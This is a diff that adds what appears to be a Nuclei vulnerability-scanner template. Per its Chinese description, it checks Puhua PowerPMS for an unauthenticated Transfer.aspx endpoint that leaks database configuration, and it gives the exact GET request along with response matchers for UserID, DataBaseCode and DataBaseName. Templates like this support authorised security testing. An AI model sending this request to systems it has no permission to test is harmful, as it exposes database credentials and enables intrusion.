@@ -1,0 +1,30 @@
+id: powerpms-Transfer-disclosure
+info:
+  name: 普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞
+  author: leadlife
+  severity: high
+  description: 普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统Transfer.aspx接口存在信息泄露漏洞，攻击者可在无需认证的情况下，通过直接访问该文件，获取系统中存储的数据库配置信息，可能导致数据库数据泄露，进而引发未授权访问和系统控制风险。
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: powerpms,disclosure
+
+http:
+  - raw:
+      - |
+        GET /PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'UserID','DataBaseCode','DataBaseName')
+        condition: and
